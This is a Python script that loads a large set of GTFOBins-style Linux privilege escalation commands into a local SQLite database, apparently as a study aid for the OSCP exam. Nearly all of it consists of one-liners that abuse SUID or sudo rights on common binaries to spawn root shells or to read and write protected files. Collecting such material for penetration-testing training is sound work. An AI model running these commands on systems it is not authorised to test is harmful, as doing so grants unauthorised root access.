#!/usr/bin/env python3
"""
GTFOBins Full Importer for OSCP Database
Comprehensive SUID and SUDO privilege escalation techniques
"""

import sqlite3
import os

DB_PATH = os.path.expanduser("~/.oscp_commands.db")

# GTFOBins SUID escalation commands (COMPLETE LIST)
gtfobins_suid = {
    "aria2c": 'COMMAND=id\nTF=$(mktemp)\necho "$COMMAND" > $TF\nchmod +x $TF\n./aria2c --on-download-error=$TF http://x',
    "arp": 'LFILE=file_to_read\n./arp -v -f "$LFILE"',
    "ash": './ash',
    "base64": 'LFILE=file_to_read\n./base64 "$LFILE" | base64 --decode',
    "bash": './bash -p',
    "busybox": './busybox sh',
    "cat": 'LFILE=file_to_read\n./cat "$LFILE"',
    "chmod": 'LFILE=file_to_change\n./chmod 6777 $LFILE',
    "chown": 'LFILE=file_to_change\n./chown $(id -u):$(id -g) $LFILE',
    "cp": 'LFILE=file_to_write\nTF=$(mktemp)\necho "DATA" > $TF\n./cp $TF $LFILE',
    "csh": './csh -b',
    "curl": 'LFILE=file_to_read\n./curl file://$LFILE',
    "dash": './dash -p',
    "date": 'LFILE=file_to_read\n./date -f $LFILE',
    "dd": 'LFILE=file_to_write\necho "data" | ./dd of=$LFILE',
    "diff": 'LFILE=file_to_read\n./diff --line-format=%L /dev/null $LFILE',
    "docker": './docker run -v /:/mnt --rm -it alpine chroot /mnt sh',
    "ed": './ed\n!/bin/sh',
    "emacs": './emacs -Q -nw --eval \'(term "/bin/sh -p")\'',
    "env": './env /bin/sh -p',
    "expand": 'LFILE=file_to_read\n./expand "$LFILE"',
    "expect": './expect -c "spawn /bin/sh -p;interact"',
    "file": 'LFILE=file_to_read\n./file -f $LFILE',
    "find": './find . -exec /bin/sh -p \\; -quit',
    "flock": './flock -u / /bin/sh -p',
    "fmt": 'LFILE=file_to_read\n./fmt -999 "$LFILE"',
    "fold": 'LFILE=file_to_read\n./fold -w99999999 "$LFILE"',
    "gawk": './gawk \'BEGIN {system("/bin/sh")}\'',
    "gdb": './gdb -nx -ex \'python import os; os.execl("/bin/sh", "sh", "-p")\' -ex quit',
    "gimp": './gimp -idf --batch-interpreter=python-fu-eval -b \'import os; os.execl("/bin/sh", "sh", "-p")\'',
    "grep": 'LFILE=file_to_read\n./grep \'\' $LFILE',
    "head": 'LFILE=file_to_read\n./head -c1G "$LFILE"',
    "ionice": './ionice /bin/sh -p',
    "ip": 'LFILE=file_to_read\n./ip -force -batch $LFILE',
    "jq": 'LFILE=file_to_read\n./jq -Rr . "$LFILE"',
    "ksh": './ksh -p',
    "ld.so": './ld.so /bin/sh -p',
    "less": './less file_to_read\n!/bin/sh',
    "logsave": './logsave /dev/null /bin/sh -i -p',
    "lua": './lua -e \'os.execute("/bin/sh -p")\'',
    "make": 'COMMAND=\'/bin/sh -p\'\n./make -s --eval=$\'x:\\n\\t-\'$COMMAND',
    "more": './more file_to_read\n!/bin/sh',
    "mv": 'LFILE=file_to_write\nTF=$(mktemp)\necho "DATA" > $TF\n./mv $TF $LFILE',
    "nano": './nano\n^R^X\nreset; sh -p 1>&0 2>&0',
    "nawk": './nawk \'BEGIN {system("/bin/sh")}\'',
    "nice": './nice /bin/sh -p',
    "nl": 'LFILE=file_to_read\n./nl -bn -w1 -s \'\' $LFILE',
    "nmap": 'TF=$(mktemp)\necho \'os.execute("/bin/sh")\' > $TF\n./nmap --script=$TF',
    "node": './node -e \'require("child_process").spawn("/bin/sh", ["-p"], {stdio: [0, 1, 2]})\'',
    "od": 'LFILE=file_to_read\n./od -An -c -w9999 "$LFILE"',
    "openssl": 'LFILE=file_to_read\n./openssl enc -in "$LFILE"',
    "perl": './perl -e \'exec "/bin/sh";\'',
    "php": './php -r "pcntl_exec(\'/bin/sh\', [\'-p\']);"',
    "python": './python -c \'import os; os.execl("/bin/sh", "sh", "-p")\'',
    "python3": './python3 -c \'import os; os.execl("/bin/sh", "sh", "-p")\'',
    "rlwrap": './rlwrap -H /dev/null /bin/sh -p',
    "rpm": './rpm --eval \'%{lua:os.execute("/bin/sh", "-p")}\'',
    "rpmquery": './rpmquery --eval \'%{lua:posix.exec("/bin/sh", "-p")}\'',
    "rsync": './rsync -e \'sh -p -c "sh 0<&2 1>&2"\' 127.0.0.1:/dev/null',
    "ruby": './ruby -e \'exec "/bin/sh"\'',
    "run-parts": './run-parts --new-session --regex \'^sh$\' /bin --arg=\'-p\'',
    "rvim": './rvim -c \':py import os; os.execl("/bin/sh", "sh", "-pc", "reset; exec sh -p")\'',
    "sed": './sed -n \'1e exec sh -p 1>&0\' /etc/hosts',
    "setarch": './setarch $(arch) /bin/sh -p',
    "shuf": 'LFILE=file_to_read\n./shuf -e "$LFILE"',
    "socat": './socat stdin exec:/bin/sh,pty,stderr,setsid,sigint,sane',
    "sort": 'LFILE=file_to_read\n./sort -m "$LFILE"',
    "sqlite3": './sqlite3 /dev/null \'.shell /bin/sh -p\'',
    "ssh": './ssh -o ProxyCommand=\';sh -p 0<&2 1>&2\' x',
    "start-stop-daemon": './start-stop-daemon -n $RANDOM -S -x /bin/sh -- -p',
    "stdbuf": './stdbuf -i0 /bin/sh -p',
    "strace": './strace -o /dev/null /bin/sh -p',
    "systemctl": 'TF=$(mktemp).service\necho \'[Service]\nType=oneshot\nExecStart=/bin/sh -c "id > /tmp/output"\n[Install]\nWantedBy=multi-user.target\' > $TF\n./systemctl link $TF\n./systemctl enable --now $TF',
    "tail": 'LFILE=file_to_read\n./tail -c1G "$LFILE"',
    "tar": './tar -cf /dev/null /dev/null --checkpoint=1 --checkpoint-action=exec=/bin/sh',
    "taskset": './taskset 1 /bin/sh -p',
    "tee": 'LFILE=file_to_write\necho DATA | ./tee -a "$LFILE"',
    "time": './time /bin/sh -p',
    "timeout": './timeout 7d /bin/sh -p',
    "ul": 'LFILE=file_to_read\n./ul "$LFILE"',
    "unexpand": 'LFILE=file_to_read\n./unexpand -t99999999 "$LFILE"',
    "uniq": 'LFILE=file_to_read\n./uniq "$LFILE"',
    "unshare": './unshare -r /bin/sh',
    "vi": './vi -c \':!/bin/sh\' /dev/null',
    "vim": './vim -c \':py import os; os.execl("/bin/sh", "sh", "-pc", "reset; exec sh -p")\' /dev/null',
    "watch": './watch -x sh -p -c \'reset; exec sh -p 1>&0 2>&0\'',
    "wget": 'LFILE=file_to_read\n./wget -i $LFILE',
    "xargs": './xargs -a /dev/null sh -p',
    "xxd": 'LFILE=file_to_read\n./xxd "$LFILE" | xxd -r',
    "zip": 'TF=$(mktemp -u)\n./zip $TF /etc/hosts -T -TT \'sh -p #\'\nrm $TF',
    "zsh": './zsh',
}

# GTFOBins SUDO escalation commands (COMPLETE LIST)
gtfobins_sudo = {
    "aria2c": 'COMMAND=id\nTF=$(mktemp)\necho "$COMMAND" > $TF\nchmod +x $TF\nsudo aria2c --on-download-error=$TF http://x',
    "arp": 'LFILE=file_to_read\nsudo arp -v -f "$LFILE"',
    "ash": 'sudo ash',
    "awk": 'sudo awk \'BEGIN {system("/bin/sh")}\'',
    "base64": 'LFILE=file_to_read\nsudo base64 "$LFILE" | base64 --decode',
    "bash": 'sudo bash',
    "busybox": 'sudo busybox sh',
    "cat": 'LFILE=file_to_read\nsudo cat "$LFILE"',
    "chmod": 'LFILE=file_to_change\nsudo chmod 6777 $LFILE',
    "chown": 'LFILE=file_to_change\nsudo chown $(id -u):$(id -g) $LFILE',
    "cp": 'LFILE=file_to_write\nTF=$(mktemp)\necho "DATA" > $TF\nsudo cp $TF $LFILE',
    "csh": 'sudo csh',
    "curl": 'LFILE=file_to_read\nsudo curl file://$LFILE',
    "cut": 'LFILE=file_to_read\nsudo cut -d "" -f1 "$LFILE"',
    "dash": 'sudo dash',
    "date": 'LFILE=file_to_read\nsudo date -f $LFILE',
    "dd": 'LFILE=file_to_write\necho "data" | sudo dd of=$LFILE',
    "diff": 'LFILE=file_to_read\nsudo diff --line-format=%L /dev/null $LFILE',
    "docker": 'sudo docker run -v /:/mnt --rm -it alpine chroot /mnt sh',
    "ed": 'sudo ed\n!/bin/sh',
    "emacs": 'sudo emacs -Q -nw --eval \'(term "/bin/sh")\'',
    "env": 'sudo env /bin/sh',
    "expand": 'LFILE=file_to_read\nsudo expand "$LFILE"',
    "expect": 'sudo expect -c "spawn /bin/sh;interact"',
    "file": 'LFILE=file_to_read\nsudo file -f $LFILE',
    "find": 'sudo find . -exec /bin/sh \\; -quit',
    "flock": 'sudo flock -u / /bin/sh',
    "fmt": 'LFILE=file_to_read\nsudo fmt -999 "$LFILE"',
    "fold": 'LFILE=file_to_read\nsudo fold -w99999999 "$LFILE"',
    "gawk": 'sudo gawk \'BEGIN {system("/bin/sh")}\'',
    "gdb": 'sudo gdb -nx -ex \'!sh\' -ex quit',
    "gimp": 'sudo gimp -idf --batch-interpreter=python-fu-eval -b \'import os; os.system("sh")\'',
    "grep": 'LFILE=file_to_read\nsudo grep \'\' $LFILE',
    "head": 'LFILE=file_to_read\nsudo head -c1G "$LFILE"',
    "ionice": 'sudo ionice /bin/sh',
    "ip": 'LFILE=file_to_read\nsudo ip -force -batch $LFILE',
    "jq": 'LFILE=file_to_read\nsudo jq -Rr . "$LFILE"',
    "ksh": 'sudo ksh',
    "less": 'sudo less /etc/profile\n!/bin/sh',
    "logsave": 'sudo logsave /dev/null /bin/sh -i',
    "lua": 'sudo lua -e \'os.execute("/bin/sh")\'',
    "make": 'COMMAND=\'/bin/sh\'\nsudo make -s --eval=$\'x:\\n\\t-\'$COMMAND',
    "man": 'sudo man man\n!/bin/sh',
    "more": 'sudo more /etc/profile\n!/bin/sh',
    "mv": 'LFILE=file_to_write\nTF=$(mktemp)\necho "DATA" > $TF\nsudo mv $TF $LFILE',
    "nano": 'sudo nano\n^R^X\nreset; sh 1>&0 2>&0',
    "nawk": 'sudo nawk \'BEGIN {system("/bin/sh")}\'',
    "nice": 'sudo nice /bin/sh',
    "nl": 'LFILE=file_to_read\nsudo nl -bn -w1 -s \'\' $LFILE',
    "nmap": 'TF=$(mktemp)\necho \'os.execute("/bin/sh")\' > $TF\nsudo nmap --script=$TF',
    "node": 'sudo node -e \'require("child_process").spawn("/bin/sh", {stdio: [0, 1, 2]})\'',
    "od": 'LFILE=file_to_read\nsudo od -An -c -w9999 "$LFILE"',
    "openssl": 'LFILE=file_to_read\nsudo openssl enc -in "$LFILE"',
    "perl": 'sudo perl -e \'exec "/bin/sh";\'',
    "php": 'CMD="/bin/sh"\nsudo php -r "system(\'$CMD\');"',
    "python": 'sudo python -c \'import os; os.system("/bin/sh")\'',
    "python3": 'sudo python3 -c \'import os; os.system("/bin/sh")\'',
    "rlwrap": 'sudo rlwrap /bin/sh',
    "rpm": 'sudo rpm --eval \'%{lua:os.execute("/bin/sh")}\'',
    "rpmquery": 'sudo rpmquery --eval \'%{lua:posix.exec("/bin/sh")}\'',
    "rsync": 'sudo rsync -e \'sh -c "sh 0<&2 1>&2"\' 127.0.0.1:/dev/null',
    "ruby": 'sudo ruby -e \'exec "/bin/sh"\'',
    "run-parts": 'sudo run-parts --new-session --regex \'^sh$\' /bin',
    "rvim": 'sudo rvim -c \':py import os; os.execl("/bin/sh", "sh", "-c", "reset; exec sh")\'',
    "sed": 'sudo sed -n \'1e exec sh 1>&0\' /etc/hosts',
    "setarch": 'sudo setarch $(arch) /bin/sh',
    "shuf": 'LFILE=file_to_read\nsudo shuf -e "$LFILE"',
    "socat": 'sudo socat stdin exec:/bin/sh',
    "sort": 'LFILE=file_to_read\nsudo sort -m "$LFILE"',
    "sqlite3": 'sudo sqlite3 /dev/null \'.shell /bin/sh\'',
    "ssh": 'sudo ssh -o ProxyCommand=\';sh 0<&2 1>&2\' x',
    "start-stop-daemon": 'sudo start-stop-daemon -n $RANDOM -S -x /bin/sh',
    "stdbuf": 'sudo stdbuf -i0 /bin/sh',
    "strace": 'sudo strace -o /dev/null /bin/sh',
    "systemctl": 'TF=$(mktemp).service\necho \'[Service]\nType=oneshot\nExecStart=/bin/sh -c "id > /tmp/output"\n[Install]\nWantedBy=multi-user.target\' > $TF\nsudo systemctl link $TF\nsudo systemctl enable --now $TF',
    "tail": 'LFILE=file_to_read\nsudo tail -c1G "$LFILE"',
    "tar": 'sudo tar -cf /dev/null /dev/null --checkpoint=1 --checkpoint-action=exec=/bin/sh',
    "taskset": 'sudo taskset 1 /bin/sh',
    "tee": 'LFILE=file_to_write\necho DATA | sudo tee -a "$LFILE"',
    "time": 'sudo time /bin/sh',
    "timeout": 'sudo timeout 7d /bin/sh',
    "ul": 'LFILE=file_to_read\nsudo ul "$LFILE"',
    "unexpand": 'LFILE=file_to_read\nsudo unexpand -t99999999 "$LFILE"',
    "uniq": 'LFILE=file_to_read\nsudo uniq "$LFILE"',
    "unshare": 'sudo unshare -r /bin/sh',
    "vi": 'sudo vi -c \':!/bin/sh\' /dev/null',
    "vim": 'sudo vim -c \':!/bin/sh\'',
    "watch": 'sudo watch -x sh -c \'reset; exec sh 1>&0 2>&0\'',
    "wget": 'LFILE=file_to_read\nsudo wget -i $LFILE',
    "xargs": 'sudo xargs -a /dev/null sh',
    "xxd": 'LFILE=file_to_read\nsudo xxd "$LFILE" | xxd -r',
    "zip": 'TF=$(mktemp -u)\nsudo zip $TF /etc/hosts -T -TT \'sh #\'\nsudo rm $TF',
    "zsh": 'sudo zsh',
}

def import_gtfobins():
    conn = sqlite3.connect(DB_PATH)
    cursor = conn.cursor()
    
    added_suid = 0
    added_sudo = 0
    
    print(f"[*] Importing GTFOBins to {DB_PATH}")
    print(f"[*] SUID binaries to add: {len(gtfobins_suid)}")
    print(f"[*] SUDO binaries to add: {len(gtfobins_sudo)}")
    print()
    
    # Import SUID binaries
    for tool, command in gtfobins_suid.items():
        desc = f"{tool} SUID privilege escalation"
        tags = f"suid,{tool},privesc,gtfobins"
        try:
            cursor.execute("""
                INSERT INTO commands (tool, description, command, category, tags)
                VALUES (?, ?, ?, ?, ?)
            """, (tool, desc, command, "privesc-linux", tags))
            added_suid += 1
            print(f"  [+] Added SUID: {tool}")
        except sqlite3.IntegrityError:
            print(f"  [SKIP] {tool} SUID already exists")
    
    # Import SUDO binaries
    for tool, command in gtfobins_sudo.items():
        desc = f"{tool} sudo privilege escalation"
        tags = f"sudo,{tool},privesc,gtfobins"
        try:
            cursor.execute("""
                INSERT INTO commands (tool, description, command, category, tags)
                VALUES (?, ?, ?, ?, ?)
            """, (tool, desc, command, "privesc-linux", tags))
            added_sudo += 1
            print(f"  [+] Added SUDO: {tool}")
        except sqlite3.IntegrityError:
            print(f"  [SKIP] {tool} SUDO already exists")
    
    conn.commit()
    conn.close()
    
    print(f"\n{'='*60}")
    print(f"[+] Import complete!")
    print(f"    SUID binaries added: {added_suid}/{len(gtfobins_suid)}")
    print(f"    SUDO binaries added: {added_sudo}/{len(gtfobins_sudo)}")
    print(f"    Total commands added: {added_suid + added_sudo}")
    print(f"{'='*60}\n")
    print(f"[*] Test with:")
    print(f"    oscp --cat privesc-linux | grep gtfobins")
    print(f"    oscp sudo perl")
    print(f"    oscp find suid")
    print(f"    oscp python privesc")

if __name__ == "__main__":
    print("\n" + "="*60)
    print("GTFOBins Full Importer - OSCP Database Patch")
    print("="*60 + "\n")
    import_gtfobins()
